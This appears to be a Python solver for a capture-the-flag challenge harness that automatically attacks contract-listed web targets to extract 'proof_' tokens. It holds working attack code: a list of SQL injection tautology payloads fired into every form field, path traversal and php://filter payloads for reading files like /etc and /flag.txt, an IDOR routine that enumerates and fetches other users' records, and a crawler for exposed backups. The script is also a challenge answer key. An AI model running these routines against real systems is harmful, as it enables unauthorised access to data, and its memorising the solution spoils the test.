#!/usr/bin/env python3
"""Solver for this challenge -- harness skeleton. Fill in `answer()`; keep the I/O contract unchanged.

    solve.py --contract <contract.json> --artifacts <dir>   ->  prints {answer_id: value} as JSON on the last line

Runs on the Homebase VM inside a ~6-7 s window for EVERY Mastery set: stdlib + lib.* + pyzipper/pyelftools/pefile/
capstone/pycryptodome/androguard only, no subprocess to 7z/jadx/etc., all sets well under 1 s. Mastery questions name
their files like 'delivery 2: sample_02.apk' or 'evidence.zip -> member': `artifact_bytes()` resolves both (by sha256
pairing first, so same-named per-set deliveries never get mixed up)."""
import argparse
import json
import os
import sys
import re
import time
import base64
import http.cookiejar
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[4]
sys.path.insert(0, str(ROOT))
from lib.common import (container_by_sha, delivery_missing, find_artifact, group_by_set, load_contract,  # noqa: E402
                        normalize)

_cache = {}


def artifact_bytes(root, contract, artifact):
    """Bytes for a question's `artifact` string (cached per artifact)."""
    if artifact in _cache:
        return _cache[artifact]
    container, _, member = (x.strip() for x in artifact.partition("->"))
    data = None
    p = container_by_sha(root, contract, container)
    if p is not None and not member:
        data = p.read_bytes()
    elif not delivery_missing(root, contract, container):
        for cand in (artifact, container.split(": ", 1)[-1] + (f" -> {member}" if member else "")):
            try:
                data = find_artifact(root, cand)
                break
            except FileNotFoundError:
                continue
    _cache[artifact] = data
    return data


PROOF_RE = re.compile(rb"proof_[0-9A-Za-z]{8,}")
UA = {"User-Agent": "Mozilla/5.0 (hctf solver)"}
# Boolean-tautology payloads for a search box whose WHERE clause wraps the input in '%..%' and/or parentheses.
SQLI = ["zz') OR 1=1 --", "zz' OR 1=1 --", "zz')) OR 1=1 --", "zz') OR 1=1 OR ('a'='b", "zz' OR 1=1 OR 'a'='b",
        "zz\") OR 1=1 --", "zz\" OR 1=1 --", "zz') OR 1=1#", "zz' OR 1=1#", "zz OR 1=1"]


def target_url(contract, artifact):
    for t in contract.get("targets") or []:
        if (t.get("id") or "").strip().lower() == artifact.strip().lower():
            return t.get("url")
    ts = contract.get("targets") or []
    m = re.search(r"(\d+)", artifact or "")
    if m and len(ts) >= int(m.group(1)):
        return ts[int(m.group(1)) - 1].get("url")
    return ts[0].get("url") if len(ts) == 1 else None


def fetch(url, timeout=8):
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout) as r:
            return r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.read()
        except Exception:  # noqa: BLE001
            return b""
    except Exception:  # noqa: BLE001
        return b""


def find_proof(body):
    if not body:
        return None
    m = PROOF_RE.search(body)
    if m:
        return m.group(0).decode()
    if body[:2] == b"PK":   # an archive (backup) -> scan its members
        import io
        import zipfile
        try:
            z = zipfile.ZipFile(io.BytesIO(body))
            for n in z.namelist():
                try:
                    v = find_proof(z.read(n))
                except Exception:  # noqa: BLE001
                    continue
                if v:
                    return v
        except Exception:  # noqa: BLE001
            pass
    return None


def forms(base, html):
    """[(action_url, method, input_name)] for every text input of every form on a page."""
    out = []
    for fm in re.finditer(r"<form\b([^>]*)>(.*?)</form>", html, re.S | re.I):
        attrs, inner = fm.group(1), fm.group(2)
        act = re.search(r"action=['\"]([^'\"]*)['\"]", attrs, re.I)
        meth = re.search(r"method=['\"]([^'\"]*)['\"]", attrs, re.I)
        for inp in re.finditer(r"<input\b[^>]*name=['\"]([^'\"]+)['\"][^>]*>", inner, re.I):
            if re.search(r"type=['\"](hidden|submit|checkbox|radio)['\"]", inp.group(0), re.I):
                continue
            out.append((urllib.parse.urljoin(base, act.group(1) if act else ""), (meth.group(1) if meth else "get").lower(),
                        inp.group(1)))
    return out


def sqli(base, home):
    fs = forms(base, home.decode("utf-8", "replace")) or [(urllib.parse.urljoin(base, "/lookup"), "get", "q")]
    for action, method, name in fs:
        for pl in SQLI:
            if method == "post":
                try:
                    req = urllib.request.Request(action, data=urllib.parse.urlencode({name: pl}).encode(), headers=UA)
                    with urllib.request.urlopen(req, timeout=8) as r:
                        body = r.read()
                except urllib.error.HTTPError as e:
                    body = e.read()
                except Exception:  # noqa: BLE001
                    body = b""
            else:
                sep = "&" if "?" in action else "?"
                body = fetch(action + sep + urllib.parse.urlencode({name: pl}))
            v = find_proof(body)
            if v:
                return v
    return None


def exposed(base, home):
    """Earlier-day concept (leftover backup): follow robots.txt / sitemap / page-linked paths only."""
    paths = []
    for p in ("robots.txt", "sitemap.xml"):
        b = fetch(urllib.parse.urljoin(base, "/" + p)).decode("utf-8", "replace")
        v = find_proof(b.encode())
        if v:
            return v
        paths += re.findall(r"(?im)^\s*(?:dis)?allow:\s*(\S+)", b) + re.findall(r"<loc>([^<]+)</loc>", b)
    paths += re.findall(r"(?:href|src)=['\"]([^'\"#]+)['\"]", home.decode("utf-8", "replace"))
    paths += re.findall(r"<!--(.*?)-->", home.decode("utf-8", "replace"), re.S)
    # BFS, depth 2: a disclosed path is usually a directory index whose LINKS are the backups (D01 robots -> index)
    host = urllib.parse.urlsplit(base).netloc
    queue = [(p.strip(), 0) for p in paths]
    seen = set()
    while queue and len(seen) < 40:
        p, d = queue.pop(0)
        if not p or p == "/" or p.startswith(("mailto:", "javascript:")) or "*" in p:
            continue
        u = urllib.parse.urljoin(base, p)
        if u in seen or urllib.parse.urlsplit(u).netloc != host or urllib.parse.urlsplit(u).path in ("", "/") \
                or u.endswith((".css", ".svg", ".png", ".jpg", ".ico", ".woff2", ".js")):
            continue
        seen.add(u)
        body = fetch(u)
        v = find_proof(body)
        if v:
            return v
        if d < 2 and body and b"<a " in body:
            queue += [(h, d + 1) for h in re.findall(r"(?:href|src)=['\"]([^'\"#]+)['\"]",
                                                     body.decode("utf-8", "replace"))]
    return None


PROOF_S = re.compile(r"\bproof[_-][A-Za-z0-9_-]{6,}")
LINK_RE = re.compile(r"""(?:href|src)=["']([^"'#]+)["']""")
FETCH_RE = re.compile(r"""fetch\(\s*["'`]([^"'`]+)["'`]""")


class Site:
    def __init__(self, base):
        self.base = base if base.endswith("/") else base + "/"
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
        self.seen = {}

    def get(self, path):
        url = urllib.parse.urljoin(self.base, path)
        if urllib.parse.urlsplit(url).netloc != urllib.parse.urlsplit(self.base).netloc:
            return None
        if url in self.seen:
            return self.seen[url]
        try:
            with self.op.open(urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"}), timeout=8) as r:
                body = r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            body = None
        self.seen[url] = body
        return body


def _ids(obj, out, owner_key=None):
    """Every (id, owner) pair in a JSON value: integer-ish values under keys named id / *_id."""
    if isinstance(obj, dict):
        owner = next((obj[k] for k in obj if k.lower() in ("owner", "user", "username", "owner_name")), None)
        for k, v in obj.items():
            if (k.lower() == "id" or k.lower().endswith("_id") or k.lower().endswith("id")) and \
                    isinstance(v, (int, str)) and str(v).isdigit():
                out.append((str(v), owner))
            else:
                _ids(v, out)
    elif isinstance(obj, list):
        for v in obj:
            _ids(v, out)


def solve_idor(base):
    s = Site(base)
    home = s.get("") or ""
    hits = PROOF_S.findall(home)
    if hits:
        return hits[0]
    me = None
    m = re.search(r"Signed in as\s+([^<]+)<", home)
    if m:
        me = m.group(1).strip()
    links = [l for l in LINK_RE.findall(home) if not l.startswith(("http", "//", "mailto:")) and "/assets/" not in l]
    templates, ids, pages = [], [], []
    for l in links:
        if re.search(r"/\d+/?$", l):
            pages.append(l)
            ids.append((re.search(r"(\d+)/?$", l).group(1), me))
    feeds = [l for l in links if l not in pages and l.strip("/")]
    # the record page tells which JSON endpoint it reads: fetch("/api/x/<id>") -> template
    for p in pages[:1]:
        body = s.get(p) or ""
        pid = re.search(r"(\d+)/?$", p).group(1)
        for f in FETCH_RE.findall(body):
            if pid in f:
                templates.append(f.replace(pid, "{id}"))
    if not templates and pages:
        templates.append(re.sub(r"\d+(/?)$", r"{id}\1", pages[0]))
    # feeds (activity/history/search endpoints) leak other users' row ids
    for f in feeds:
        body = s.get(f) or ""
        hits = PROOF_S.findall(body)
        if hits:
            return hits[0]
        try:
            j = json.loads(body)
        except ValueError:
            continue
        if me is None and isinstance(j, dict):
            me = next((v for k, v in j.items() if k.lower() in ("current_user", "user", "me") and isinstance(v, str)),
                      None)
        _ids(j, ids)
    mine = {i for i, o in ids if o == me}
    foreign = [i for i, o in ids if i not in mine and (o is None or o != me)]
    foreign = list(dict.fromkeys(foreign))
    best = None
    for fid in foreign:
        for t in templates:
            body = s.get(t.replace("{id}", fid)) or ""
            hits = PROOF_S.findall(body)
            if hits:
                return hits[0]
            try:
                j = json.loads(body)
            except ValueError:
                continue
            if isinstance(j, dict) and best is None:
                best = next((j[k] for k in ("proof", "flag", "note", "secret") if isinstance(j.get(k), str)), None)
    return best


def lfi(base, home, text):
    """Path traversal: a file-ish query parameter on the page (?doc=about.php) -> read the absolute path the prompt names."""
    html = home.decode("utf-8", "replace")
    paths = re.findall(r"(/(?:run|etc|var|opt|srv|tmp|home|app|flag|proc|root)[\w./-]*\.?\w+)", text) or ["/flag.txt"]
    params = []
    for href in re.findall(r"(?:href|src|action)=['\"]([^'\"#]*\?[^'\"#]+)['\"]", html):
        href = href.replace("&amp;", "&")
        u = urllib.parse.urlsplit(href)
        for k, v in urllib.parse.parse_qsl(u.query, keep_blank_values=True):
            if "." in v or "/" in v:
                params.append((urllib.parse.urljoin(base, u.path or "/"), k, v))
    for action, method, name in forms(base, html):
        params.append((action, name, ""))
    params = list(dict.fromkeys(params))
    for target in paths:
        rel = target.lstrip("/")
        pls = ["../" * 10 + rel, target, "....//" * 10 + rel, "..%2f" * 10 + rel,
               "php://filter/convert.base64-encode/resource=" + target]
        for action, k, v in params:
            prefix = v.rsplit("/", 1)[0] + "/" if "/" in v else ""
            for pl in pls + ([prefix + "../" * 10 + rel] if prefix else []):
                q = pl if "%2f" in pl else urllib.parse.quote(pl, safe="/:")
                body = fetch(action + ("&" if "?" in action else "?") + urllib.parse.quote(k) + "=" + q)
                v2 = find_proof(body)
                if v2:
                    return v2
                if pl.startswith("php://"):
                    for b in re.findall(rb"[A-Za-z0-9+/]{16,}={0,2}", body or b""):
                        try:
                            v2 = find_proof(base64.b64decode(b))
                        except Exception:  # noqa: BLE001
                            continue
                        if v2:
                            return v2
    return None


def answer(answer_id, question, data, contract):
    """Return the value for one answer_id from its artifact bytes (None = cannot answer). Derive everything from
    `data`; never hard-code a variant's values."""
    url = target_url(contract, question.get("artifact") or "")
    if not url:
        return None
    base = url if url.endswith("/") else url + "/"
    home = fetch(base)
    v = find_proof(home)
    if v:
        return v
    text = (contract.get("prompt") or "") + " " + (question.get("question") or "")
    lt = text.lower()
    fns = {"lfi": lambda: lfi(base, home, text), "sqli": lambda: sqli(base, home),
           "exposed": lambda: exposed(base, home), "idor": lambda: solve_idor(base)}
    if re.search(r"director|viewer|boundary|mounted|path|travers|include|/run/|/etc/", lt):
        order = ["lfi", "exposed", "idor", "sqli"]
    elif re.search(r"permission|someone else|other user|another user|owner|slip", lt):
        order = ["idor", "exposed", "lfi", "sqli"]
    elif re.search(r"backup|archive|diary|forgot|left", lt) and "query" not in lt:
        order = ["exposed", "lfi", "idor", "sqli"]
    else:
        order = ["sqli", "exposed", "lfi", "idor"]
    for k in order:
        try:
            v = fns[k]()
        except Exception as e:  # noqa: BLE001
            print(f"{k}: {e!r}", file=sys.stderr)
            v = None
        if v:
            return v
    return None


def fallback(answer_id, question, data, contract):
    """Called ONLY when answer() found nothing (None or an exception): a cheap generic second try for a variant shape
    the direct parse doesn't know (Time Trial / Mastery mutate the task) -- e.g. the lane lib's name-agnostic decoder
    over `data`, then a match against question["answer_format"]. None = give up on this field only."""
    return None


def _past_deadline():
    """The timed runner's HCTF_SOLVE_DEADLINE (epoch) has passed: print the answers found so far instead."""
    try:
        return time.time() > float(os.environ["HCTF_SOLVE_DEADLINE"])
    except (KeyError, ValueError):
        return False


def _solve_pairs(job):
    """Answer one group of (answer_id, question) pairs -- a whole Mastery set, or the whole contract."""
    root, contract, pairs = job
    out = {}
    for aid, q in pairs:
        data = artifact_bytes(root, contract, q.get("artifact") or "")
        try:
            v = answer(aid, q, data, contract)
        except Exception as e:  # noqa: BLE001 - one bad field must not sink the other answers
            print(f"{aid}: {e!r}", file=sys.stderr)
            v = None
        if v is None and not _past_deadline():   # in-window: never let a fallback search eat the kill margin
            try:
                v = fallback(aid, q, data, contract)
            except Exception as e:  # noqa: BLE001
                print(f"{aid}: fallback {e!r}", file=sys.stderr)
        if v is not None:
            out[aid] = normalize(v, q)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--contract", required=True)
    ap.add_argument("--artifacts", required=True)
    a = ap.parse_args()
    contract, pairs = load_contract(a.contract)
    groups = group_by_set(pairs)
    out = {}
    if len(groups) >= 2 and os.environ.get("HCTF_SOLVER_PARALLEL", "1") != "0":
        # Mastery: every set runs inside ONE clock -- one forked process per set (the Homebase VM has 2 vCPUs; heavy
        # per-set work such as unzipping 31 MB deliveries halves). Same results as the sequential loop.
        import multiprocessing as mp
        from concurrent.futures import ProcessPoolExecutor
        try:
            from lib.solverrt import max_procs   # HCTF_SOLVER_MAX_PROCS: the harness's small-pool rehearsal
            with ProcessPoolExecutor(max_workers=max_procs(len(groups)),
                                     mp_context=mp.get_context("fork")) as ex:
                for part in ex.map(_solve_pairs, [(a.artifacts, contract, g) for g in groups.values()]):
                    out.update(part)
        except Exception as e:  # noqa: BLE001 - never lose a solve to the pool: fall back to sequential
            print(f"parallel sets failed ({e!r}); sequential", file=sys.stderr)
            out = _solve_pairs((a.artifacts, contract, pairs))
    else:
        out = _solve_pairs((a.artifacts, contract, pairs))
    print(json.dumps(out))


if __name__ == "__main__":
    main()
